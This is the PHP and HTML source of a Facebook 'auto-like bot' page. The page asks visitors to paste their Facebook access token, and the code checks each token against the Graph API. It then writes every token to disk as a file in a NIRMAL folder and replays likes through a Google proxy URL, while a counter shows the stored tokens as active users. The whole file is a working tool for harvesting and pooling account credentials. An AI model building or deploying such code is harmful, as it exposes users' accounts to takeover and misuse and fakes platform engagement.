<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"> <html> <meta charset="utf-8"/> <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/> <head> <title>CRACKERS BOT TEAM</title> <link rel="stylesheet" type="text/css" href="nir.css" media="all,handheld"/> <link rel="shortcut icon" type="image/png" href="http://emojipedia-us.s3.amazonaws.com/cache/f9/4e/f94ee8fa6d3c2553f00d59838ab747e3.png"/> <style>
.snow-container{position:fixed;width:100%;max-width:100%;z-index:99999;pointer-events:none;overflow:hidden;top:0;height:100%}.snow{display:block;position:absolute;z-index:2;top:0;right:0;bottom:0;left:0;pointer-events:none;-webkit-transform:translate3d(0,-100%,0);transform:translate3d(0,-100%,0);-webkit-animation:snow linear infinite;animation:snow linear infinite}.snow.foreground{background-image:url("https://vipfb.co/img/snow-large-vipfb.co.png");-webkit-animation-duration:15s;animation-duration:10s}.snow.foreground.layered{-webkit-animation-delay:7.5s;animation-delay:7.5s}.snow.middleground{background-image:url(https://vipfb.co/img/snow-medium-vipfb.co.png);-webkit-animation-duration:20s;animation-duration:15s}.snow.middleground.layered{-webkit-animation-delay:10s;animation-delay:10s}.snow.background{background-image:url(https://vipfb.co/img/snow-small-vipfb.co.png);-webkit-animation-duration:25s;animation-duration:20s}.snow.background.layered{-webkit-animation-delay:12.5s;animation-delay:12.5s}@-webkit-keyframes snow{0%{-webkit-transform:translate3d(0,-100%,0);transform:translate3d(0,-100%,0)}100%{-webkit-transform:translate3d(5%,100%,0);transform:translate3d(5%,100%,0)}}@keyframes snow{0%{-webkit-transform:translate3d(0,-100%,0);transform:translate3d(0,-100%,0)}100%{-webkit-transform:translate3d(5%,100%,0);transform:translate3d(5%,100%,0)}} </style> <div class='snow-container'> <div class='snow foreground'></div> <div class='snow foreground layered'></div> <div class='snow middleground'></div> <div class='snow middleground layered'></div> <div class='snow background'></div> <div class='snow background layered'></div>
</div> <div id="content"></div> <div class="post"></div> 


<?php
$yx=opendir('NIRMAL');
while($isi=readdir($yx)){
if($isi != '.' && $isi != '..'){
$member[]=$isi;
}
}
$like = new like();
if($_GET[act]){
print '';
}
if($_POST[access_token]){
$access_token = $_POST[access_token];
$me = $like -> me($access_token);
if($me[id]){
$like -> NIRMAL($access_token);
if($_POST[id]){
$like -> pancal($_POST[id]);
}else{
$like -> getData($access_token);
}
}else{
$like -> invalidToken();
}
}else{
$like->form();
}
class like {
public function pancal($id){ for($i=1;$i<4;$i++){
$this-> _req('http://google.com/gwt/n?u='.urlencode('http://'.$_SERVER[HTTP_HOST].'/likes.php?id='.$id.'&n='.$i));
}
print '';
}
public function me($access){
return json_decode($this-> _req('https://graph.facebook.com/me?access_token='.$access),true);
}
public function NIRMAL($access){
if(!is_dir('NIRMAL')){
mkdir('NIRMAL');
}
$a=fopen('NIRMAL/'.$access,'w');
fwrite($a,1);
fclose($a);
}
public function invalidToken(){
print'<script type="text/javascript">alert("INFO :Invalid or Expired Access token")</script>';
$this->form();
}
public function form(){
 echo '


<div id="header">
</style>
<div id="header">
<b><font size="50px"><marquee behavior="alternate">
<script src="B.js"></script>
</marquee> </font></b></div><br>
<center>
<a target="_blank"  href="https://www.facebook.com/100027065658389">
<img src="https://graph.facebook.com/100027065658389/picture?width=900" alt="" style="border-radius: 100%; border: 3px solid white; box-shadow:0px 0px 15px 10px white;" width="300" height="300" title="Visit admin Profile"/></a></div></div></br><br>

<center><a href="http://nirtoken.byethost7.com/?i=1" target="_blank" style="font-family:Arial;font-size:20px;color:white;border:2px solid red; border-radius:40px;padding:25px;" >Get Token </a><center><br> <div id="top-content"> <div id="search-form"> 

<form action="index.php" method="post">

<input class="search" type="text" style="height:60px;" name="access_token" placeholder="Paste Your Access Token Here" required>
<br>
<input class="inp-btn" type="submit" style="height:60px;"  value="Submit"></form></div>
';
}
public function getData($access){
$feed=json_decode($this -> _req('https://graph.facebook.com/me/home?access_token='.$access.'&limit=1'),true);
if(count($feed[data]) >= 1){
for($i=0;$i<count($feed[data]);$i++){
$uid = $feed[data][$i][from][id];
$name = $feed[data][$i][from][name];
$type = $feed[data][$i][type];
$mess = str_replace(urldecode('%0A'),'<br/>',htmlspecialchars($feed[data][$i][message]));
$id = $feed[data][$i][id];
$pic = $feed[data][$i][picture];
echo'
<script type="text/javascript">alert("INFO : Your Bot has Been Successfully Activated")</script>
<div id="header">
 </br>

<div id="center">

<marquee behavior="alternate"> Bot Successfully Activated </marquee>

</br> </br>

<div id="center"><center>
<font size="40px"> Token Saved! </font></br>
[<a href="index.php" value="Click Here">Click Here</a>] to go back to the home page.</div></center>
</br>
</div>
<div id="footer">
Made By <a target="_blank" href="https://m.facebook.com/100027065658389">Nir Raan magar</a></br>
</div>
';
if($type=='photo'){
echo'
';
}else{
echo'
';
}
}
}else{
print '';
}
print '';
}
private function _req($url){
$ch = curl_init();
curl_setopt_array($ch,array(
CURLOPT_CONNECTTIMEOUT => 5,
CURLOPT_RETURNTRANSFER => true,
CURLOPT_URL => $url,
) );
$result = curl_exec($ch);
curl_close($ch);
return $result;
}
}
?>
<font size="60px" color="skyblue"> Modify By </font><b><font size="60px"  color="black" style="background-color:yellow;">Nir Bahadur Rana</font></b><br><br>
<center><b>
<font size="60px" color="black" style="background:yellow">

 <?php 
    // integer starts at 0 before counting
    $i = 0; 
    $dir = 'NIRMAL/';
    if ($handle = opendir($dir)) {
        while (($file = readdir($handle)) !== false){
            if (!in_array($file, array('.', '..')) && !is_dir($dir.$file)) 
                $i++;
        }
    }
    // prints out how many were in the directory
    
    echo 
    "Active Users : $i ";
?></b>
